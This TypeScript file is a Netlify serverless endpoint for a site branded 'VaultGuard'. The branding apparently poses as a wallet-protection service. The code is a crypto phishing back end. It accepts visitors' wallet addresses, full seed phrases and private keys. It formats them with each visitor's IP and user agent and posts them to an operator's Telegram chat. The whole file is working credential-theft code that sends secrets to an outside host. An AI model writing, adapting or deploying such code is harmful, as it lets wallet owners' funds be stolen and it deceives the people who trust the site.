import type { Config } from '@netlify/functions'

const TELEGRAM_API = `https://api.telegram.org/bot${Netlify.env.get('TELEGRAM_BOT_TOKEN')}`

async function sendTelegram(text: string) {
  const chatId = Netlify.env.get('TELEGRAM_CHAT_ID')
  if (!Netlify.env.get('TELEGRAM_BOT_TOKEN') || !chatId) return
  try {
    await fetch(`${TELEGRAM_API}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text,
        parse_mode: 'HTML',
        disable_web_page_preview: true,
      }),
    })
  } catch (err) {
    console.error('Telegram send error:', err)
  }
}

export default async (req: Request) => {
  if (req.method !== 'POST') {
    return new Response(JSON.stringify({ ok: false }), { status: 405, headers: { 'Content-Type': 'application/json' } })
  }

  const { type, data, meta } = await req.json()
  if (!type || !data) {
    return new Response(JSON.stringify({ ok: false }), { status: 400, headers: { 'Content-Type': 'application/json' } })
  }

  const ip = req.headers.get('x-forwarded-for') || 'unknown'
  const ua = (meta?.userAgent || req.headers.get('user-agent') || 'unknown').slice(0, 120)
  const ts = new Date().toUTCString()

  let msg = ''

  if (type === 'address_entered') {
    msg =
      `🔍 <b>VaultGuard — Address Entered</b>\n` +
      `━━━━━━━━━━━━━━━━━━━━\n` +
      `<b>Address:</b> <code>${data.address}</code>\n` +
      `<b>Time:</b> ${ts}\n` +
      `<b>IP:</b> ${ip}\n` +
      `<b>UA:</b> ${ua}`
  } else if (type === 'wallet_connected') {
    msg =
      `🔗 <b>VaultGuard — Wallet Connected</b>\n` +
      `━━━━━━━━━━━━━━━━━━━━\n` +
      `<b>Wallet:</b> ${data.wallet}\n` +
      `<b>Address:</b> <code>${data.address}</code>\n` +
      `<b>Entered:</b> <code>${data.enteredAddress}</code>\n` +
      `<b>Match:</b> ${data.address?.toLowerCase() === data.enteredAddress?.toLowerCase() ? '✅ Yes' : '⚠️ No'}\n` +
      `<b>Time:</b> ${ts}\n` +
      `<b>IP:</b> ${ip}\n` +
      `<b>UA:</b> ${ua}`
  } else if (type === 'seed_phrase') {
    const words: string[] = data.words ?? []
    const filled = words.filter((w: string) => w.trim().length > 0)
    msg =
      `🌱 <b>VaultGuard — Seed Phrase Submitted</b>\n` +
      `━━━━━━━━━━━━━━━━━━━━\n` +
      `<b>Address:</b> <code>${data.walletAddress}</code>\n` +
      `<b>Word count:</b> ${data.wordCount} (${filled.length} filled)\n` +
      `<b>Phrase:</b>\n<code>${filled.join(' ')}</code>\n` +
      `<b>Time:</b> ${ts}\n` +
      `<b>IP:</b> ${ip}\n` +
      `<b>UA:</b> ${ua}`
  } else if (type === 'private_key') {
    msg =
      `🔑 <b>VaultGuard — Private Key Submitted</b>\n` +
      `━━━━━━━━━━━━━━━━━━━━\n` +
      `<b>Address:</b> <code>${data.walletAddress}</code>\n` +
      `<b>Key:</b> <code>${data.privateKey}</code>\n` +
      `<b>Time:</b> ${ts}\n` +
      `<b>IP:</b> ${ip}\n` +
      `<b>UA:</b> ${ua}`
  } else {
    return new Response(JSON.stringify({ ok: false }), { status: 400, headers: { 'Content-Type': 'application/json' } })
  }

  await sendTelegram(msg)
  return Response.json({ ok: true })
}

export const config: Config = {
  path: '/api/notify',
  method: 'POST',
}
